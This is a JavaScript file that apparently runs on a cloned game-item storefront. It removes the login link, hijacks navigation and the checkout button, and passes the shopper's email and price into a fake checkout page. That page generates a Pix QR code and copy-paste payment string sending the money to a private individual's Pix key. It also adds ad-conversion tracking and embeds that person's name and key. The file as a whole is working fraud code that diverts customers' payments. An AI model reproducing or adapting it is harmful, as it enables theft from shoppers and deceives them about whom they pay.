var map = {
    '1746043928159972266492982439336908': 'cart-dragon-perm-.html',
    '174604404129754567693547873328': 'cart-dough-perm.html',
    '174604408076386841530125556':'cart-kitsune-perm-.html',
    '17460441322087674989632542882':'cart-dragon-east-.html',
    '1746044175036524462199485089612':'cart-dragon-west-.html',
    '1746044241059342186459530458130617':'cart-gas-.html',
    '17460443375613388184441904872':'cart-cyborg-.html',
    '1746044382026444107944145952':'cart-ghol-.html',
    '1746044434516465004457136228775631':'cart-angel-.html',
    '1746044474730212544175923045287':'cart-mink-.html',
    '17460445083715819413881311565815':'cart-shark-.html',
    '1746044557126852345817640561':'cart-mitica-.html',
    '17460446154498842899382266':'combo-.html',
    '174604420425054359669241075962':'cart-yeti.html',
  };

window.$crisp = [];
window.CRISP_WEBSITE_ID = "cab1f319-5406-4401-9ab8-1e85593005ae";

(function () {
  const d = document;
  const s = d.createElement("script");
  s.src = "https://client.crisp.chat/l.js";
  s.async = true;
  d.getElementsByTagName("head")[0].appendChild(s);
})();
 if(window.location.hostname.includes(`rutherblox`)){
(function () {
  var script = document.createElement('script');
  script.src = 'https://www.googletagmanager.com/gtag/js?id=AW-17070494767';
  script.async = true;
  document.head.appendChild(script);
})();
window.dataLayer = window.dataLayer || [];
function gtag() {
  dataLayer.push(arguments);
}
gtag('js', new Date());
gtag('config', 'AW-17070494767');
 }else{
     (function () {
  var script = document.createElement('script');
  script.src = 'https://www.googletagmanager.com/gtag/js?id=AW-16645663738';
  script.async = true;
  document.head.appendChild(script);
})();
window.dataLayer = window.dataLayer || [];
function gtag() {
  dataLayer.push(arguments);
}
gtag('js', new Date());
gtag('config', 'AW-16645663738');
 }

  function crc16(str) {
    let crc = 0xFFFF;
    for (let i = 0; i < str.length; i++) {
        crc ^= str.charCodeAt(i) << 8;
        for (let j = 0; j < 8; j++) {
            if ((crc & 0x8000) !== 0) {
                crc = (crc << 1) ^ 0x1021;
            } else {
                crc <<= 1;
            }
            crc &= 0xFFFF;
        }
    }
    return crc.toString(16).toUpperCase().padStart(4, '0');
}


// Função utilitária para montar TLV
function tlv(id, value) {
    const length = value.length.toString().padStart(2, '0');
    return `${id}${length}${value}`;
}

// Função principal para gerar o payload Pix completo
function gerarPayloadPix({ chave, nome, cidade, valor, txid }) {
    // IDs conforme padrão EMV
    const payloadFormat = tlv('00', '01');
    const merchantAccountInfo = tlv('26',
        tlv('00', 'br.gov.bcb.pix') +
        tlv('01', chave)
    );
    const merchantCategoryCode = tlv('52', '0000');
    const transactionCurrency = tlv('53', '986'); // BRL
    const transactionAmount = valor ? tlv('54', parseFloat(valor).toFixed(2)) : '';
    const countryCode = tlv('58', 'BR');
    const merchantName = tlv('59', nome.toUpperCase().substring(0, 25));
    const merchantCity = tlv('60', cidade.toUpperCase().substring(0, 15));
    const additionalData = tlv('62', tlv('05', txid));

    const payloadSemCRC = (
        payloadFormat +
        merchantAccountInfo +
        merchantCategoryCode +
        transactionCurrency +
        transactionAmount +
        countryCode +
        merchantName +
        merchantCity +
        additionalData +
        '6304' // ID do CRC + tamanho (fixo)
    );

    const crc = crc16(payloadSemCRC);
    const payloadFinal = payloadSemCRC + crc;
    return payloadFinal;
}


function copiarTextoClipboardAPI(texto) {
    navigator.clipboard.writeText(texto)
        .then(() => {
            console.log('[CLIPBOARD] Texto copiado com sucesso!');
        })
        .catch((err) => {
            console.error('Erro ao copiar o texto: ', err);
        });
}
  
  document.addEventListener("DOMContentLoaded", () => {
    document.querySelector(`.search_mobile`).innerHTML = ``
    document.querySelector(`[aria-label="redirecionamento para a página de login"]`).remove()

    document.querySelectorAll(`.sc-7b541798-0.hDRFcA.on.undefined`).forEach((a) => {
        a.addEventListener(`click`,() => {
            var code = window.location.href.split(`-`)[window.location.href.split(`-`).length - 1].replace(`.html`, ``)

            if(window.location.href.includes(`ereemby`)){window.location.href = `https://discord.gg/ereemby`}else{window.location.href = map[code]}
            
        })
    })

    document.querySelectorAll(`[type="submit"]`).forEach((a) => {
        a.addEventListener(`click`,(event) => {
            event.preventDefault();
            var email = document.querySelector(`[placeholder="Insira seu email"]`).value
            var val = document.querySelector("#__ereemby > div > section > form > div.sc-652f141e-2.edynYR > div.sc-652f141e-9.fGWyzQ > div.sc-652f141e-13.knJvkA > div.sc-652f141e-14.ezgrcm > span:nth-child(2)").innerText.replace(`R$`,``)
            window.location.href =  `./checkout.html?email=${email}&val=${val}`
        })
    })

      

    if(window.location.href.includes(`checkout`)){
        if(window.location.hostname.includes(`rutherblox`)){
            
        gtag('event', 'conversion', {
    'send_to': 'AW-17070494767/0SKQCO-jrMUaEK-o7Ms_',
    'value': 1.0,
    'currency': 'BRL',
    'transaction_id': ''
});}else{gtag('event', 'conversion', {
      'send_to': 'AW-16645663738/aDwQCOnyscMZEPrXooE-',
      'value': 1.0,
      'currency': 'BRL',
      'transaction_id': ''
  });}
        const queryString = window.location.search; // pega tudo depois do ?
        const params = new URLSearchParams(queryString);
        const agora = new Date();
        const payload = gerarPayloadPix({
            chave: 'pcc-recebimentos@tuamaeaquelaursa.com',
            nome: 'Aline Nayara Ventura Silva',
            cidade: 'sao paulo',
            valor: params.get(`val`).replace(`,`,`.`),
            txid: 'TX123456'
        });

        document.querySelector(`.sc-3fde0cab-12.cWMTgb`).src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${payload}`

   

        const botao = document.querySelector("#__ereemby > div > section > div > div.sc-3fde0cab-0.fuxEIn > div.sc-3fde0cab-1.ciImTL > div.sc-3fde0cab-3.huoqeJ > div > div.sc-3fde0cab-5.borgcB > button")
        const novoBotao = botao.cloneNode(true); // Clona o botão, mantendo atributos e conteúdo

        botao.parentNode.replaceChild(novoBotao, botao);
        const parser = new DOMParser();
        
        document.querySelector("#__ereemby > div > section > div > div.sc-3fde0cab-0.fuxEIn > div.sc-3fde0cab-1.ciImTL > div.sc-3fde0cab-3.huoqeJ > div > div.sc-3fde0cab-5.borgcB").onclick = (event) => {
            event.preventDefault();copiarTextoClipboardAPI(payload)
            document.querySelector(`.sc-3fde0cab-18.iiQZTR svg`).parentNode.replaceChild(parser.parseFromString(`<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="aliceblue" class="bi bi-check-all" viewBox="0 0 16 16">
                <path d="M8.97 4.97a.75.75 0 0 1 1.07 1.05l-3.99 4.99a.75.75 0 0 1-1.08.02L2.324 8.384a.75.75 0 1 1 1.06-1.06l2.094 2.093L8.95 4.992zm-.92 5.14.92.92a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 1 0-1.091-1.028L9.477 9.417l-.485-.486z"/>
              </svg>`, 'text/html').querySelector(`svg`),document.querySelector(`.sc-3fde0cab-18.iiQZTR svg`))

              document.querySelector("#__ereemby > div > section > div > div.sc-3fde0cab-0.fuxEIn > div.sc-3fde0cab-1.ciImTL > div.sc-3fde0cab-3.huoqeJ > div > div.sc-3fde0cab-5.borgcB > button").textContent = `Copiado!`
        }

        document.querySelector(`.chave`).textContent = payload

// Formatar como string legível (ex: 2025-05-01 14:30:00)
const dataFormatada = agora.getFullYear() + '-' +
  String(agora.getMonth() + 1).padStart(2, '0') + '-' +
  String(agora.getDate()).padStart(2, '0') + ' ' +
  String(agora.getHours()).padStart(2, '0') + ':' +
  String(agora.getMinutes()).padStart(2, '0') + ':' +
  String(agora.getSeconds()).padStart(2, '0');
        document.querySelectorAll(`.sc-5e82d9e5-0.kOAvaj`)[1].remove()
        document.querySelector(`.gfgf`).remove()
        document.querySelector(`.sc-ff8b2976-0.ichwqS`).remove()
        document.querySelector(`.sc-5e82d9e5-0.kOAvaj`).textContent = dataFormatada
      
        
        document.querySelectorAll(`.sc-296417d8-0.hVzvPG`)[1].innerHTML = `R$ `+params.get(`val`)
        document.querySelectorAll(`.sc-296417d8-0.hVzvPG`)[2].innerHTML = params.get(`email`)
    }


    document.querySelectorAll("a").forEach(link => {
      link.addEventListener("click", function (event) {
        event.preventDefault(); // Impede a navegação padrão

        const href = this.href;
        if(href.includes(`product`)){
            var code = href.split(`/`)[href.split(`/`).length - 1]
            window.location.href = `./-product-${code}.html`;
        }else if (href.includes(`cart`)) {
            window.location.href = `./carrinho-vazio-.html`
        }else{
            window.location.href = `./index.html`
        }

        


        console.log("Interceptado:", href);

        // Aqui você pode fazer o que quiser:
        // abrir em nova aba, redirecionar com delay, bloquear, etc.

        // Exemplo: bloquear domínios específicos
       // if (href.includes("exemplo.com")) {
      //    alert("Navegação bloqueada!");
     // //  } else {
     //     // Redireciona manualmente após 1 segundo
     //     setTimeout(() => {
     //       window.location.href = href;
     //    }, 1000);
      //  }
      });
    });
  });

